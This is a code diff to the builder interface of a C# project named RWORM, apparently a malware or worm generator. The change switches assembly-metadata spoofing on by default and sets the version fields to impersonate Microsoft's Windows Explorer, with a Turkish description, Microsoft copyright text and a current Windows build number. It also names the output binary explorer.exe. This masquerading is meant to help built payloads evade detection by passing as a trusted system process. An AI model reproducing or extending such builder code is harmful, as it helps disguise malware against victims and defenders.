@@ -69,13 +69,13 @@ namespace RWORM.GUI.ViewModels
 
         // New Builder Assembly / Icon / Pastebin options
         private bool   _buildPastebinEnabled = false;
-        private bool   _buildAssemblyEnabled = false;
-        private string _buildAssemblyTitle = "Notepad";
-        private string _buildAssemblyDescription = "Notepad";
+        private bool   _buildAssemblyEnabled = true;
+        private string _buildAssemblyTitle = "explorer";
+        private string _buildAssemblyDescription = "Windows Gezgini";
         private string _buildAssemblyCompany = "Microsoft Corporation";
-        private string _buildAssemblyProduct = "Microsoft® Windows® Operating System";
-        private string _buildAssemblyCopyright = "© Microsoft Corporation. All rights reserved.";
-        private string _buildAssemblyVersion = "10.0.19041.4522";
+        private string _buildAssemblyProduct = "Microsoft® Windows® İşletim Sistemi";
+        private string _buildAssemblyCopyright = "© Microsoft Corporation. Tüm hakları saklıdır.";
+        private string _buildAssemblyVersion = "10.0.26100.1710";
 
         private bool   _buildIconEnabled = false;
         private string _buildIconPath = "";
@@ -1486,7 +1486,8 @@ namespace RWORM.GUI.ViewModels
                 var stderr = await proc.StandardError.ReadToEndAsync();
                 await proc.WaitForExitAsync();
 
-                var src = System.IO.Path.Combine(tempOutput, "RWORM.exe");
+                var src = System.IO.Path.Combine(tempOutput, "explorer.exe");
+                if (!System.IO.File.Exists(src)) src = System.IO.Path.Combine(tempOutput, "RWORM.exe");
                 if (System.IO.File.Exists(src))
                 {
                     System.IO.File.Copy(src, dlg.FileName, true);
